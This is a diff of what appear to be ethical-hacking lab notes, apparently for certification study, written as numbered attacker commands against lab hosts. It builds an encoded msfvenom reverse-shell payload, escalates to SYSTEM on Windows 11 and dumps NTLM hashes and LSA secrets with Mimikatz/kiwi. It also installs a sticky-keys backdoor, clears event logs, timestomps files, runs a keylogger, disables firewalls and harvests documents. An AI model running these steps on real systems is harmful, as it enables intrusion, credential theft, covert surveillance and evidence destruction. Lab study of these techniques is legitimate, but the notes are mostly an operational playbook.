@@ -1,3 +1,5 @@
+*** System hacking is the process of testing computer systems and software for security vulnerabilities that an attacker could exploit to gain access to the organization’s systems to steal or misuse sensitive information. ***
+======================================================================================================================================================================================================================================================================================================================================================================================================================================
 # Perform Active Online Attack to Crack the System’s Password using Responder
 -------------------------------------------------------------------------------
 >>> Ubuntu Machine [Attacker/10.10.1.9]
@@ -78,8 +80,8 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 
 =========================================================================================================================================================================================================================================================================================================================================================================================================================================
 
-# Escalate Privileges(Windows 11) using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities 
-------------------------------------------------------------------------------------------------
+# Escalate Privileges(Windows 11) using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities AND post exploitations :
+------------------------------------------------------------------------------------------------------------------------------------
 >>> Parrot Machine [Attacker/10.10.1.13]
 1. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe (creating payload using msfvenom)
 2. mkdir /var/www/html/share  >>  chmod -R 755 /var/www/html/share   >>  chown -R www-data:www-data /var/www/html/share  >>  ls -la /var/www/html/ | grep share  (sending the malicious payload through a shared directory) 
@@ -90,12 +92,15 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 6. Open browser(firefox)  >> search for "http://10.10.1.13/share" >> download and run exploit.exe
 >>> Parrot Machine [Attacker/10.10.1.13]
 7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session 1 opened)
+
 8. upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1(PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.)
 9. shell(to get shell access) >>  powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” (to run the PowerUp.ps1 file)
+
 10. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
 11. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
 13. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)
-14. upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
+
+14. background  >>  upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
 15. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
 16. exit (to go back to meterpreter and close shell)
 17. background (type in meterpreter session to run current session in background and use msf for run new exploits,payload,post,etc)
@@ -103,13 +108,45 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 19. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
 20. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
 21. getuid >> sysinfo   >>     run post/windows/gather/smart_hashdump (extracts the NTLM hashes)    >>    clearev (clearing logs)
+
 # Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys 
 22. background  >>  use post/windows/manage/sticky_keys >> sessions i*  >>  set session 2(privileged session)  >> exploit 
+
 # Escalate Privileges to Gather Hashdump using Mimikatz
 23. load kiwi >>  help kiwi  >>  
     >> lsa_dump_sam (to load NTLM Hash of all users.)
     >> lsa_dump_secrets (LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.)
     >> "password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password" (change the password of Admin using the password_change module)
+
+24. POST EXPLOITATIONS (In Metasploit) : 
+   a. sysinfo , ipconfig  , getuid , pwd , ls , cat [filename.txt]
+   b. While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified/-m, accessed/-a, created/-c, entry/-e) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information. To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file. 
+      >> timestomp Secret.txt -v   (This displays the created time, accessed time, modified time, and entry modified time)
+      >> timestomp Secret.txt -m “02/11/2018 08:10:03”   (changes the Modified value of the Secret.txt file)
+      >> Similarly, you can change the Accessed (-a), Created (-c), and Entry Modified (-e) values of a particular file
+   c.  search -f [Filename.extension] (here, pagefile.sys)      [displays the location of the searched file]
+   d. KEYLOGING : capturing all keyboard input from the target system.
+      >> keyscan_start  (start keyloging)
+      >> keyscan_dump  (show all the captured keystrokes)
+   e. idletime (display the amount of time for which the user has been idle on the remote system)
+
+25. POST EXPLOITATIONS (In Shell) :
+   a. dir /a:h    ( retrieve the directory names with hidden attributes)
+   b. sc queryex type=service state=all     ( to list all the available services)
+   c. Now, we will list details about specific service : 
+      >> netsh firewall show state    (display current firewall state.)
+      >> netsh firewall show config   (view the current firewall settings in the target system.)
+      >> wmic /node:"" product get name,version,vendor      ( view the details of installed software)
+      >> wmic cpu get     ( to retrieve the processor’s details)
+      >> wmic useraccount get name,sid    (to retrieve login names and SIDs of the users)
+      >> net start or stop       (Starts/stops a network service)
+      >> netsh advfirewall set currentprofile state off       (Turn off firewall service for current profile)
+      >> netsh advfirewall set allprofiles state off        (Turn off firewall service for all profiles)
+   d. Post Escalating PRIVILEGES
+      >> findstr /E ".txt" > txt.txt        (Retrieves all the text files (needs privileged access))
+      >> findstr /E ".log" > log.txt      (Retrieves all the log files (needs privileged access))
+      >> findstr /E ".doc" > doc.txt      (Retrieves all the document files (needs privileged access))
+   e. wmic os where Primary='TRUE' reboot     (to reboot the target system)
 
 =======================================================================================================================================================================================================================================================================================================================================================================================================================================
 
